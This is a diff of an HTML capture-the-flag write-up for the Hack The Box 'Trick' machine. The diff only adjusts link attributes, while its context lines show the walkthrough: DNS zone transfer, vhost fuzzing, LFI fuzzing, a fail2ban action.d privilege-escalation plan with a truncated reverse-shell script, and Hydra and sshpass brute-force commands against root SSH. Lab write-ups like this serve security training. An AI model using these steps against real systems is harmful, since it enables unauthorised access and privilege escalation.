@@ -25,7 +25,7 @@
 
 
 
-<link rel="stylesheet" href="/main.95aad797b4ac37875a27d7418e1f17962c12ae6eba2ef3abc677cd14fad7fc5e.css">
+<link rel="stylesheet" href="/main.653e12f307c49620b5b1ba68d8bf5a05c6ab0038af0589bca65686d5dbc02602.css">
 
 
 
@@ -160,7 +160,9 @@ if (!doNotTrack) {
           <img src="https://www.hackthebox.com/storage/avatars/ca56ef43d636aff7da48a8b484756cfe.png" alt="Trick Write-Up" />
           
           
-            <figcaption class="center">Machine created by <a href="https://app.hackthebox.com/users/184611">Geiseric</a></figcaption>
+            <figcaption class="center">Machine created by 
+
+<a href="https://app.hackthebox.com/users/184611" target="_blank">Geiseric</a></figcaption>
           
         </figure>
       
@@ -253,7 +255,9 @@ if (!doNotTrack) {
 <p><img src="main_page_port80.png" alt="Main Page Port 80"></p>
 <p>It&rsquo;s a single static page with no useful information.</p>
 <h4 id="port-53-udptcp">Port 53 (UDP/TCP)</h4>
-<p>I&rsquo;ll try first to look for <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns#zone-transfer"><em>Zone Transfer</em></a> if enabled in order to get more information about the target since I don&rsquo;t even know its domain name.</p>
+<p>I&rsquo;ll try first to look for 
+
+<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns#zone-transfer" target="_blank"><em>Zone Transfer</em></a> if enabled in order to get more information about the target since I don&rsquo;t even know its domain name.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ dig axfr @10.10.11.166
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>; &lt;&lt;&gt;&gt; DiG 9.18.7-1-Debian &lt;&lt;&gt;&gt; axfr @10.10.11.166
@@ -284,17 +288,27 @@ if (!doNotTrack) {
 <h2 id="enumerating-web-server">Enumerating Web Server</h2>
 <h3 id="vhost-enumeration">VHOST Enumeration</h3>
 <p>After some simple directory bruteforcing on <em>preprod-payroll.trick.htb</em>, I came to a dead end. The only thing I found was a login page and a <em>database</em> directory giving me a <em>403</em> forbidden, and I wasn&rsquo;t able to find any files there with the simple wordlists I use.</p>
-<p>So I had to enumerate <em>vhosts</em> looking for some hidden domains. Again using a simple wordlist from <a href="https://github.com/danielmiessler/SecLists"><em>seclists</em></a> called <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt"><em>subdomains-top1million-5000.txt</em></a> I wasn&rsquo;t able to find anything, however this time I had a clue about the manner they name their domain, it seems that they append the prefix <em>preprod-</em> to thier domain, so why not doing the same and bruteforce vhosts again using this prefix.</p>
+<p>So I had to enumerate <em>vhosts</em> looking for some hidden domains. Again using a simple wordlist from 
+
+<a href="https://github.com/danielmiessler/SecLists" target="_blank"><em>seclists</em></a> called 
+
+<a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt" target="_blank"><em>subdomains-top1million-5000.txt</em></a> I wasn&rsquo;t able to find anything, however this time I had a clue about the manner they name their domain, it seems that they append the prefix <em>preprod-</em> to thier domain, so why not doing the same and bruteforce vhosts again using this prefix.</p>
 <ul>
 <li>
-<p>Enumerating vhosts using <a href="https://github.com/OJ/gobuster"><em>Gobuster</em></a>:</p>
+<p>Enumerating vhosts using 
+
+<a href="https://github.com/OJ/gobuster" target="_blank"><em>Gobuster</em></a>:</p>
 <ul>
-<li>I can create a new wordlist from <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt"><em>subdomains-top1million-5000.txt</em></a> by appending <em>preprod-</em> to each line using sed: <code>sed 's/^/preprod-/' /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt &gt; new_custom_wordlist.txt</code></li>
+<li>I can create a new wordlist from 
+
+<a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt" target="_blank"><em>subdomains-top1million-5000.txt</em></a> by appending <em>preprod-</em> to each line using sed: <code>sed 's/^/preprod-/' /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt &gt; new_custom_wordlist.txt</code></li>
 <li>Then use vhost flag with gobuster <code>gobuster vhost -w new_custom_wordlist.txt -u trick.htb --append-domain</code></li>
 </ul>
 </li>
 <li>
-<p>Enumerating vhosts using <a href="https://github.com/ffuf/ffuf"><em>Ffuf</em></a>:</p>
+<p>Enumerating vhosts using 
+
+<a href="https://github.com/ffuf/ffuf" target="_blank"><em>Ffuf</em></a>:</p>
 <ul>
 <li>Here I don&rsquo;t need to create a new wordlist, but I do need to filter requests on the size because the server responds with <em>200 response code</em> on any random subdomain, so the only way to know if the subdomain is valid is by getting a different content length: <code>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://trick.htb/ -H 'Host: preprod-FUZZ.trick.htb' -fs 5480</code></li>
 <li><em>Note</em>: This is the same technique that <em>gobuster vhost</em> flag uses.</li>
@@ -306,8 +320,14 @@ if (!doNotTrack) {
 <p>Navigating to this new domain, I can clearly see that it is a new website:</p>
 <p><img src="preprod-marketing.trick.htb-main-page.png" alt="preprod-marketing.trick.htb Main Page"></p>
 <h3 id="exploiting-lfi">Exploiting LFI</h3>
-<p>Navigating to one of the present tabs, I noticed <em>?page=services.html</em> GET parameter, which might indicate a possible <a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"><em>LFI vulnerability</em></a>.</p>
-<p>Again, I&rsquo;ll use <a href="https://github.com/ffuf/ffuf"><em>Ffuf</em></a> to fuzz this parameter using <em>LFI</em> payloads from <a href="https://github.com/danielmiessler/SecLists"><em>seclists</em></a>:</p>
+<p>Navigating to one of the present tabs, I noticed <em>?page=services.html</em> GET parameter, which might indicate a possible 
+
+<a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion" target="_blank"><em>LFI vulnerability</em></a>.</p>
+<p>Again, I&rsquo;ll use 
+
+<a href="https://github.com/ffuf/ffuf" target="_blank"><em>Ffuf</em></a> to fuzz this parameter using <em>LFI</em> payloads from 
+
+<a href="https://github.com/danielmiessler/SecLists" target="_blank"><em>seclists</em></a>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://preprod-marketing.trick.htb/index.php?page<span style="color:#f92672">=</span>FUZZ -fs <span style="color:#ae81ff">0</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
@@ -415,17 +435,25 @@ if (!doNotTrack) {
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>User michael may run the following commands on trick:
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /etc/init.d/fail2ban restart
-</span></span></code></pre></div><p>User <em>michael</em> can restart <a href="https://www.fail2ban.org/wiki/index.php/Main_Page"><em>fail2ban</em></a> service, which is a service that monitors log files for certain services like apache and SSH looking for any sign of bruteforce and blocks the corresponding IP address.
+</span></span></code></pre></div><p>User <em>michael</em> can restart 
+
+<a href="https://www.fail2ban.org/wiki/index.php/Main_Page" target="_blank"><em>fail2ban</em></a> service, which is a service that monitors log files for certain services like apache and SSH looking for any sign of bruteforce and blocks the corresponding IP address.
 In addition, if I search for files owned by <em>security</em> group:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>michael@trick:~$ find / -group security 2&gt;/dev/null
 </span></span><span style="display:flex;"><span>/etc/fail2ban/action.d
-</span></span></code></pre></div><p>I can see that <em>action.d</em> directory of <a href="https://www.fail2ban.org/wiki/index.php/Main_Page"><em>fail2ban</em></a> service is owned by security group, so I might be able to abuse this for privilege escalation to root.</p>
+</span></span></code></pre></div><p>I can see that <em>action.d</em> directory of 
+
+<a href="https://www.fail2ban.org/wiki/index.php/Main_Page" target="_blank"><em>fail2ban</em></a> service is owned by security group, so I might be able to abuse this for privilege escalation to root.</p>
 <h2 id="getting-root">Getting root</h2>
 <ul>
 <li>References:
 <ul>
-<li>How fail2ban exactly works (config files &hellip;): <a href="https://www.digitalocean.com/community/tutorials/how-fail2ban-works-to-protect-services-on-a-linux-server">https://www.digitalocean.com/community/tutorials/how-fail2ban-works-to-protect-services-on-a-linux-server</a></li>
-<li><em>Abuse</em> write permission to files inside <em>action.d</em> folder: <a href="https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/">https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/</a></li>
+<li>How fail2ban exactly works (config files &hellip;): 
+
+<a href="https://www.digitalocean.com/community/tutorials/how-fail2ban-works-to-protect-services-on-a-linux-server" target="_blank">https://www.digitalocean.com/community/tutorials/how-fail2ban-works-to-protect-services-on-a-linux-server</a></li>
+<li><em>Abuse</em> write permission to files inside <em>action.d</em> folder: 
+
+<a href="https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/" target="_blank">https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/</a></li>
 </ul>
 </li>
 </ul>
@@ -458,7 +486,9 @@ banaction = iptables-multiport
 <li>I can <em>rename</em> the orginal file to <em>iptables-multiport.conf.bak</em> and <em>create</em> a new file that has the <em>same name and contents</em> in addition to my malicious code.</li>
 <li>Change the permission of the file to be executable.</li>
 <li>Then restart the service with <em>sudo</em> permission.</li>
-<li>Finally trigger the ban action using <a href="https://github.com/vanhauser-thc/thc-hydra"><em>Hydra</em></a> or any other tool for bruteforcing.</li>
+<li>Finally trigger the ban action using 
+
+<a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank"><em>Hydra</em></a> or any other tool for bruteforcing.</li>
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>michael@trick:~$ cat pwn_reverse_shell.sh 
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
@@ -481,13 +511,17 @@ banaction = iptables-multiport
 </span></span></code></pre></div><p>I can either get a reverse shell or make a new <em>bash</em> executable as <em>SUID</em>.</p>
 <ul>
 <li>
-<p>Bruteforce using <a href="https://github.com/vanhauser-thc/thc-hydra"><em>Hydra</em></a>:</p>
+<p>Bruteforce using 
+
+<a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank"><em>Hydra</em></a>:</p>
 <ul>
 <li><code>hydra -l root -P /usr/share/wordlists/rockyou.txt trick.htb ssh -t 6 -vvv</code></li>
 </ul>
 </li>
 <li>
-<p>Bruteforce using <a href="https://github.com/kevinburke/sshpass"><em>SSHPass</em></a></p>
+<p>Bruteforce using 
+
+<a href="https://github.com/kevinburke/sshpass" target="_blank"><em>SSHPass</em></a></p>
 <ul>
 <li><code>for i in {1..10}; do  time sshpass -p &quot;test&quot; ssh root@trick.htb; done</code></li>
 </ul>
